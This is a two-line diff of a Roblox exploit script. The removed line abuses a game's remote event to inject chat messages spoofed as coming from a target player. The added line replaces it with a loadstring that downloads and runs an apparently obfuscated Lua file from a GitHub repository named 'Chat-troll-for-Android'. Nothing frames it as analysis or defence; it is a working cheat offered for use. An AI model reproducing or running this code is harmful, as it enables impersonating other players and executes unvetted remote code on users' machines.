@@ -1,1 +1,1 @@
-game:GetService("ReplicatedStorage").RE:FireServer("GlobalReplicate", { ["Type"]= "AddChat", ["From"]= game:GetService("Players").TargetUsername, ["Text"]= "hi", ["Size"]= 14, ["Tag"]= "" })
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Chat-troll-for-Android/main/Protected%20(8).lua'),true))()
